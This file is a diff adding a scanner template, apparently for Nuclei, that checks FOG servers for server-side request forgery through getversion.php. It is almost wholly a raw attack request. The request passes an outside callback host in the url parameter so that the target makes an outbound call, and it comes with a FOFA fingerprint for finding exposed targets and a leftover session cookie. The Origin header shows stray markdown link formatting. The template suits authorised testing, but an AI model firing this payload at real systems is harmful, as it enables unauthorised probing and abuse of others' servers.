@@ -1,0 +1,41 @@
+id: poc-rcobgqt305np17ns
+info:
+  name: FOG getversion存在SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rcobgqt305np17ns'
+  tags: ssrf,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rcobgqt305np17ns
+    fofa: icon_hash="-1952619005"
+http:
+- raw:
+  - 'GET /fog/service/getversion.php?url=http://3.tviignppgk.zaza.eu.org HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Language: en-US,en;q=0.9
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+
+    Origin: [http://89.28.12.254:8082](http://89.28.12.254:8082)
+
+    Cookie: PHPSESSID=th9s9cds6rdis2k8dqapmhqqpo
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Length: 44'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
